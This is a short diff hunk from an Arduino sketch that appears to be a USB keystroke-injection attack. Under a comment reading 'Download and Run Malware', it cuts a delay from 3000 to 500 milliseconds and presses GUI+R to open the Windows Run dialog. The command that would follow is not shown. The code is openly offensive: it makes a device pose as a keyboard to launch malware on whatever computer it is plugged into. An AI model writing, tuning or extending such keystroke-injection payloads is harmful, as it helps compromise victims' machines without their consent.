@@ -124,7 +124,7 @@ void setup()
   Keyboard.releaseAll();
 
   // Download and Run Malware:
-  delay(3000);
+  delay(500);
   Keyboard.press(KEY_LEFT_GUI);
   Keyboard.press('r');
   Keyboard.releaseAll();
